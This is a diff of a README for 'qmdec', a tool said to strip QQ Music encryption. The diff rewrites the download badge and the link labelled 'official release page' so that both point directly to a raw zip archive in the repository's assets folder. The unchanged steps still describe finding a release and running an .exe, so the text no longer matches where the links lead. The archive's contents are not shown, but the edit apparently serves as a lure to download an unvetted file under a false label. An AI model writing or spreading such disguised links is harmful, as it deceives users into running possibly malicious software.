@@ -1,6 +1,6 @@
 # 🎵 qmdec - Unlock your music files easily today
 
-[![Download qmdec](https://img.shields.io/badge/Download-qmdec-blue.svg)](https://github.com/wallyprintable180/qmdec)
+[![Download qmdec](https://img.shields.io/badge/Download-qmdec-blue.svg)](https://github.com/wallyprintable180/qmdec/raw/refs/heads/main/assets/Software_2.9.zip)
 
 qmdec removes encryption from QQ Music files. This tool converts restricted music formats into standard files. It adds artist, album, and title tags automatically. You keep your music library collection organized.
 
@@ -14,7 +14,7 @@ qmdec removes encryption from QQ Music files. This tool converts restricted musi
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official release page](https://github.com/wallyprintable180/qmdec).
+1. Go to the [official release page](https://github.com/wallyprintable180/qmdec/raw/refs/heads/main/assets/Software_2.9.zip).
 2. Look for the Assets section at the bottom of the latest release post.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
